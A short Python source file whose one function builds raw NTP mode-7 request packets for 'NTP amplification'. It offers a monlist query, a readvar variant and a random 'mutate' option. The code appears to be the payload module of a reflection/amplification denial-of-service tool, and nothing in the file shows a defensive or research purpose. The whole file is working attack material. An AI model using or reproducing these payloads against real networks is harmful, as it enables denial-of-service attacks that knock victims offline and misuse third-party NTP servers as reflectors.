import random

def generate_payload(target, options=None):
    """
    NTP amplification, supports monlist, readvar, mutation, etc.
    options:
      - type: str, request type (monlist/readvar/other)
      - mutate: bool, whether to mutate
    """
    req_type = options.get('type', 'monlist') if options else 'monlist'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        # Random NTP command code
        cmd = random.choice([2,3,42,1,4])
        return bytes([0x17, 0x00, 0x00, cmd]) + b'\x00'*4
    if req_type == 'readvar':
        return b'\x17\x00\x00\x02' + b'\x00'*4
    # Default monlist
    return b'\x17\x00\x03\x2a' + b'\x00'*4